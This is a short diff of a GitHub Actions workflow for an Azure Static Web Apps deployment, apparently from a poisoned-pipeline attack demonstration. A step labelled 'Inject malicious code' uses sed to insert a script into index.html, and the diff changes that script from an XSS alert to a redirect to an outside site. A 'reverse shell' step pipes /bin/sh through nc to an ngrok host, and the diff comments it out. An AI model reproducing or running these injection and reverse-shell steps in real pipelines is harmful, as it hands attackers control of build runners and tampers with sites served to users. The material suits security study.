@@ -19,7 +19,7 @@ jobs:
         with:
           submodules: true
       - name: Inject malicious code
-        run: sed -i "s/<\/html>/<script>alert('XSS')<\/script><\/html>/" src/index.html
+        run: sed -i "s/<\/html>/<script>document.location.href='https://taggart-tech.com';<\/script><\/html>/" src/index.html
       - name: Build And Deploy
         id: builddeploy
         uses: Azure/static-web-apps-deploy@v1
@@ -33,8 +33,8 @@ jobs:
           api_location: "" # Api source code path - optional
           output_location: "" # Built app content directory - optional
           ###### End of Repository/Build Configurations ######
-      - name: Execute reverse shell
-        run: mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 0.tcp.ngrok.io 17614 >/tmp/f && exit 0
+      # - name: Execute reverse shell
+      #   run: mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 0.tcp.ngrok.io 17614 >/tmp/f && exit 0
 
   close_pull_request_job:
     if: github.event_name == 'pull_request' && github.event.action == 'closed'
